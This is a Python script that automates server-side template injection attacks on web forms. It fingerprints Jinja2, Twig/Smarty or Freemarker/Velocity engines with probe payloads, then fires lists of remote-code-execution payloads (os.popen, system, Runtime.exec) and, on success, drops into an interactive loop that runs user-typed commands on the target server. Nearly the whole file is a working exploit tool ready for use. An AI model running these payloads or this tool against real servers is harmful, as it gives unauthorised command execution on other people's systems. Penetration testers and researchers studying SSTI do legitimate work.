import requests
import re
import argparse


def templateInjection(url, key, other_keys):
    print("Trying to identify a template injection...")
    payloads = ["22*22", "{22*22}", "{{22*22}}", "{{{22*22}}}", "#{22*22}", "${22*22}", "{{=22*22}}", "<%=22*22%>", "[[${22*22}]]"]
    for payload in payloads:
        data = {key: payload, **other_keys}
        r = requests.post(url, data=data, timeout=3)
        print(f"Testing payload {payload}")
        if re.search(r"\b484\b", r.text):
            return True

def checkLanguage(url, key, other_keys):
    print("Trying to identify the language...")
    if pythonChecker(url, key, other_keys): return "python"
    elif phpChecker(url, key, other_keys): return "php"
    elif javaChecker(url, key, other_keys): return "java"
    else: return False
    
def pythonChecker(url, key, other_keys):
    payloads = ["{{7*'7'}}", "{{''.__class__}}"]
    footprints = [r"\b7777777\b", r"<class\s*['\"]str['\"]\s*>|<type\s*['\"]str['\"]\s*>"]
    for payload, footprint in zip(payloads, footprints):
        data = {key: payload, **other_keys}
        r = requests.post(url, data=data, timeout=3)  
        print(f"Testing payload {payload}")
        if re.search(footprint, r.text):
            return True
    return False

def phpChecker(url, key, other_keys):
    payloads = ["{{7~7}}", "{{constant('PHP_VERSION')}}", "{{[1,2,3]|join(',')}}"]
    footprints = [r"\b77\b", r"\d+\.\d+\.\d+", r" \b1,2,3\b"]
    for payload, footprint in zip(payloads, footprints):
        data = {key: payload, **other_keys}
        r = requests.post(url, data=data, timeout=3)  
        print(f"Testing payload {payload}")
        if re.search(footprint, r.text):
            print(f"{r.text} avec la requête {payload}")
            return True
    return False

def javaChecker(url, key, other_keys):
    payloads = ["${'freemarker'.toUpperCase()}", "${.version}", "#set($x=22*22) $x"]
    footprints = [r"\bFREEMARKER\b", r"\d+\.\d+\.\d+", r"\b484\b"]
    for payload, footprint in zip(payloads, footprints):
        data = {key: payload, **other_keys}
        r = requests.post(url, data=data, timeout=3) 
        print(f"Testing payload {payload}")
        if re.search(footprint, r.text):
            return True
    return False

def exploit(url, key, language, other_keys):
    match language:
        case "python":
            print("\n------------------\nPython identified\n------------------")
            print("Trying to open a shell using Jinja2 patterns")
            print("------------------------------------------------------")
            print("------------------------------------------------------")
            payloads = ["{{ get_flashed_messages.__globals__.os.popen('id').read() }}", "{{url_for.__globals__.os.popen('id').read()}}", '{{ lipsum.__init__.__globals__.os.popen("id").read() }}', 
                        '{{ url_for.__globals__.os.popen("id").read() }}', '{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read() }}']
                        
            for payload in payloads:
                try:
                    data = {key: payload, **other_keys}
                    r = requests.post(url, data=data, timeout=3) 
                    if re.search(r"uid=\d+\(.+?\)", r.text):
                        print(f"Shell obtained with payload '{payload}'\n")
                        openshell(url, key, payload, other_keys)
                        return True
                except:
                    continue
            print("No shell obtained but SSTI is confirmed")
        case "php":
            print("\n------------------\nPHP identified\n------------------")
            print("Trying to open a shell using Twig patterns")
            print("------------------------------------------------------")
            payloads = ['{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}', '{php}echo system("id");{/php}', "{$smarty.const.PHP_OS|system('id')}", "{{ `id` }}",
                        "{{#callable}}{{system('id')}}{{/callable}}", "{% set cmd = 'id' %}{{ cmd|exec }}", "{{ 'id'|filter('system') }}", "{{ _self.env.registerUndefinedFilterCallback('shell_exec') }}{{ _self.env.getFilter('id') }}",
                        "{% set payload = 'system('id')' %}{{ payload|eval }}", "{{ ['id']|map('system')|join }}", "{{ app.request.server.get('DOCUMENT_ROOT')|system('id') }}"]
            for payload in payloads:
                try:
                    data = {key: payload, **other_keys}
                    r = requests.post(url, data=data, timeout=3)  
                    if re.search(r"uid=\d+\(.+?\)", r.text):
                        print(f"Shell obtained with payload '{payload}'\n")
                        openshell(url, key, payload, other_keys)
                        return True
                except:
                    continue
            print("No shell obtained but SSTI is confirmed")
        
        
        case "java":
            print("\n------------------\nJava identified\n------------------")
            print("Trying to open a shell using Freemarker/Velocity patterns")
            print("------------------------------------------------------")
            payloads = ['${"java.lang.Runtime".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}', '${"freemarker.template.utility.Execute"?new()("id")}', 
                        '${"java.lang.Runtime".getClass().forName("java.lang.Runtime").getRuntime().exec("id").getInputStream().readAllBytes()?join("")}', '#set($rt = $null.getClass().forName("java.lang.Runtime")) $rt.getRuntime().exec("id")']
            for payload in payloads:
                try:
                    r = requests.post(url, data={f"{key}": payload})
                    if re.search(r"uid=\d+\(.+?\)", r.text):
                        print(f"Shell obtained with payload '{payload}'\n")
                        openshell(url, key, payload, other_keys)
                        return True
                except:
                    continue
            print("No shell obtained but SSTI is confirmed")

def openshell(url, key, payload, other_keys):
    try:
        cmd = input(">")
        exec = re.sub(r'\("id"\)', f'("{cmd}")', payload)
        data = {key: exec, **other_keys}
        r = requests.post(url, data=data, timeout=3) 
        print(r.text)
        openshell(url, key, payload, other_keys)
    except KeyboardInterrupt:
        print("\nExiting, thanks for playing...")
        return True
    except requests.RequestException as e:
        print(f"Error executing command: {e}")



def main():
    parser = argparse.ArgumentParser(description="Automatic exploiting of Server Side Template Injections")
    parser.add_argument('-u', '--url', type=str, help="Full URL of the POST request", required=True)
    parser.add_argument('-k', '--form-key', type=str, help="The form key you want to inject your payload in. Expected format is key1=value.key2=value.key3=value", required=True)
    parser.add_argument('-ok', '--other-keys', type=str, help="The other keys on your form", required=False)
    args = parser.parse_args()
    print("Arguments reçus :", args) 

    url = args.url
    key = args.form_key

    other_keys = {}
    if args.other_keys:
        try:
            for pair in args.other_keys.split(','):
                k, v = pair.split('=')
                other_keys[k.strip()] = v.strip()
        except ValueError:
            print("Erreur : Invalid format for --other. Use key1=value1,key2=value2")
            exit(1)
    
    print(f"Trying an SSTI on this request : {url}\nMain key: {key}\nOther keys: {other_keys}")


    if templateInjection(url, key, other_keys):
        print("\n------------------\nTemplate injection confirmed\n------------------\n")
        lang = checkLanguage(url, key, other_keys)
        if lang:
            exploit(url, key, lang, other_keys)
        else:
            print("Template engine not found but injection confirmed")

    else:
        print(f"No template injection found on POST request {url} on the key '{key}' with {other_keys}")
        exit()



if __name__ == "__main__":
    main()